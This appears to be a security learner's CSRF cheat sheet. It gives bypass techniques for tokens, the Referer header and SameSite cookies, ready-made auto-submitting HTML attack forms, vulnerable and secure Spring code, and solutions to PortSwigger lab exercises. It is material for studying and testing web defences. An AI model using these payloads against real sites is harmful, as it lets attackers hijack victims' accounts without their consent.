**CSRF** tricks an authenticated user into unknowingly submitting a request to a site they're logged into. The attack is executed when the victim visits an attacker-controlled page that silently sends a forged request — the browser automatically includes the victim's cookies, making the server think it's a legitimate action.


All three must be true for CSRF to be exploitable:

```
1. A valuable action exists           → change email, password, transfer funds, add admin
   
2. Session managed via cookies only   → no custom header auth (can't be forged cross-origin)

3. No unpredictable parameters        → no CSRF token, or the token is broken
```

## Injection Points

- Any state-changing `POST` request (change email, password, role, account settings)
- `GET` requests that perform actions (when the app doesn't enforce POST)
- Endpoints where CSRF tokens are optional, not tied to session, or not validated
- `Referer` header validation that can be bypassed or suppressed
- `SameSite=None` or unset cookies

---

## Checklist

### Detection

- [ ]  Find a sensitive state-changing action (change email, password, transfer)
- [ ]  Generate a CSRF PoC in Burp: right-click request → Engagement Tools → Generate CSRF PoC
- [ ]  Try submitting the PoC and observe if the action completes without the token

### CSRF Token Bypass Techniques

**Token not validated — just remove it:**

- [ ]  Remove the `csrf` parameter entirely from the request

```html
	<input type="hidden" name="email" value="evil@a.com">
	<!-- no csrf field -->
```

**Token not tied to session — use your own token for the victim:**

- [ ]  Log in as attacker, intercept a request, copy the CSRF token
- [ ]  Drop the request (don't consume the token)
- [ ]  Place your token in the PoC — it works for any user since it isn't session-bound:

```html
	<input type="hidden" name="csrf" value="YOUR_OWN_VALID_TOKEN">
```

**Token validated only on POST — switch to GET:**

- [ ]  Change the method to GET and pass parameters in the URL:

```html
	<form action="https://target.com/my-account/change-email">
	    <input type="hidden" name="email" value="evil@a.com">
	</form>
```

```
No `method="POST"` = defaults to GET = no CSRF token needed
```

### Referer Header Bypass

**Referer validation fails when header is absent — suppress it:**

- [ ]  Add a meta tag to stop the browser sending the Referer header at all:

```html
	<meta name="referrer" content="never">
```

**Referer validation checks for presence of target domain anywhere in Referer:**

- [ ]  Use `history.pushState` to make your attacker URL contain the target domain as a query param:

```javascript
	history.pushState('', '', '/?vulnerable-website.com');
```

```
Referer becomes: `https://attacker.com/?vulnerable-website.com` — passes the contains check
```

- [ ]  Or use a subdomain of the target as your hosting domain:

```
	http://vulnerable-website.com.attacker.com/csrf-attack
```

```
Referer starts with `http://vulnerable-website.com` — passes a startsWith check
```

- [ ]  Add `Referrer-Policy: unsafe-url` to your exploit server response headers to ensure the full URL including query string is sent as the Referer

### SameSite Cookie Bypass

**SameSite=Lax bypass via method override:**

- [ ]  Lax allows GET requests from cross-site — change POST to GET:

```html
	<form action="https://target.com/my-account/change-email">
```

- [ ]  If the endpoint requires POST, try method override parameter:

```html
	<input type="hidden" name="_method" value="POST">
```

```
Some frameworks (Laravel, Ruby on Rails, Spring) honour `_method` to override HTTP method
```

---

## Attack Payloads

**Basic CSRF PoC — auto-submitting form:**

```html
<html>
<body>
    <form action="https://target.com/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="evil&#64;attacker&#46;com">
        <input type="submit" value="Submit">
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
```

**CSRF with Referer suppression (meta referrer):**

```html
<html>
<body>
    <meta name="referrer" content="never">
    <form action="https://target.com/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="evil&#64;attacker&#46;com">
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
```

**CSRF with Referer bypass via history.pushState (add to exploit server head: `Referrer-Policy: unsafe-url`):**

```html
<html>
<body>
    <form action="https://target.com/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="evil&#64;attacker&#46;com">
    </form>
    <script>
        history.pushState('', '', '/?target.com');
        document.forms[0].submit();
    </script>
</body>
</html>
```

**CSRF with own valid token (token not tied to session):**

```html
<html>
<body>
    <form action="https://target.com/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="evil&#64;attacker&#46;com">
        <input type="hidden" name="csrf" value="YOUR_OWN_VALID_CSRF_TOKEN">
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
```

**CSRF via GET (no method = no token check):**

```html
<html>
<body>
    <form action="https://target.com/my-account/change-email">
        <input type="hidden" name="email" value="evil&#64;attacker&#46;com">
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
```

**SameSite=Lax bypass via _method override:**

```html
<html>
<body>
    <form action="https://target.com/my-account/change-email">
        <input type="hidden" name="email" value="evil&#64;attacker&#46;com">
        <input type="hidden" name="_method" value="POST">
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
```

---

## White Box Testing

**Vulnerable, CSRF token present but not validated server-side:**

```java
@PostMapping("/my-account/change-email")
public ResponseEntity<?> changeEmail(@RequestParam String email,
                                      @RequestParam(required = false) String csrf,
                                      @AuthenticationPrincipal UserDetails user) {
    // csrf param is accepted but never validated
    userService.updateEmail(user.getUsername(), email);
    return ResponseEntity.ok().build();
}
```

**Vulnerable, CSRF token validated but not tied to the user's session:**

```java
@PostMapping("/my-account/change-email")
public ResponseEntity<?> changeEmail(@RequestParam String email,
                                      @RequestParam String csrf) {
    // checks the token exists in the global token store — not that it belongs to THIS user
    if (!csrfTokenRepository.existsByToken(csrf)) {
        return ResponseEntity.status(403).build();
    }
    // attacker uses their own valid token → passes this check for any victim
    csrfTokenRepository.deleteByToken(csrf);
    userService.updateEmail(email);
    return ResponseEntity.ok().build();
}
```

**Vulnerable, Referer validation bypassable — checks contains rather than exact match:**

```java
@PostMapping("/my-account/change-email")
public ResponseEntity<?> changeEmail(HttpServletRequest request,
                                      @RequestParam String email) {
    String referer = request.getHeader("Referer");
    if (referer == null || !referer.contains("vulnerable-website.com")) {
        return ResponseEntity.status(403).build();
    }
    // attacker sends Referer: https://attacker.com/?vulnerable-website.com → passes
    userService.updateEmail(email);
    return ResponseEntity.ok().build();
}
```

**Secure:**

```java
// Spring Security handles CSRF automatically when enabled
// generates a token, ties it to the session, validates on every state-changing request
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .csrf(csrf -> csrf
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            // token stored in cookie, read by JS, sent in header — not bypassable by simple forms
        )
        .sessionManagement(session -> session
            .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
        );
    return http.build();
}

// For APIs using SameSite cookies — set cookie attributes correctly
@Bean
public CookieSerializer cookieSerializer() {
    DefaultCookieSerializer serializer = new DefaultCookieSerializer();
    serializer.setSameSite("Strict");  // or "Lax" — never "None" without good reason
    serializer.setUseSecureCookie(true);
    serializer.setHttpOnly(true);
    return serializer;
}

// Validate CSRF token is tied to the requesting session
// Spring Security does this automatically — never implement your own global token store
```


## LABS 

**CSRF with broken Referer validation**

try sending a CSRF P0c this will respond  referer header invalid 

go back to the request and  by pass it there is basically 2 methods

```
http://vulnerable-website.com.attacker-website.com/csrf-attack
```

```
http://attacker-website.com/csrf-attack?vulnerable-website.com
```


`Edit the POC`

since the 2nd method worked
``` JS
history.pushState('', '', '/?0af600c0049c54198101025c007a0096.web-security-academy.net/');
```

in the exploit server add  in the head 

``` HTTP 
Referrer-Policy: unsafe-url
```

`FINAL` 

```JS 

<html>
 <body>
 
    <form action="https://0af600c0049c54198101025c007a0096.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="testingly&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>

  <script>
      history.pushState('', '', '/?0af600c0049c54198101025c007a0096.web-security-academy.net/');
      document.forms[0].submit();
    </script>
 
 
  </body>
</html>

```


**CSRF where Referer validation depends on header being present**


After submitting a basic CSRF POC i got a referrer invalid so i added this
``` js
<meta name="referrer" content="never">
```

full exploit 

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <meta name="referrer" content="never">
    <form action="https://0ada00f403f0972e8180df5500bd0066.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;a&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```


 **CSRF where token is not tied to user session**
- intercept the request and do a POC

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a6c00b004b3436f80a63f6800b000e2.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;b&#46;com" />
      <input type="hidden" name="csrf" value="tWjObkmlP67WohTsljZmn33B82JmZOPI" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```



**CSRF where token validation depends on request method**


> change the request method POST to GET notice we dont need csrf anymore
```http
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aa5001003c267cc8173036700e800cf.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="evilish&#64;ab&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```


**CSRF where token validation depends on token being present**

>remove the CSRF
```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ac6000404bad4fead5369b4002800bc.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;a&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```


 **SameSite Lax bypass via method override**
- request method to GET
- add &_method=POST 

>Generate CSRF TO POC
```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a200093030ce89f8258d8ac007300ed.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="asdasd&#64;a&#46;com" />
      <input type="hidden" name="&#95;method" value="POST" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

### References

- https://book.hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html
- [PortSwigger CSRF](https://portswigger.net/web-security/csrf)
- [HackTricks CSRF](https://book.hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html)
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)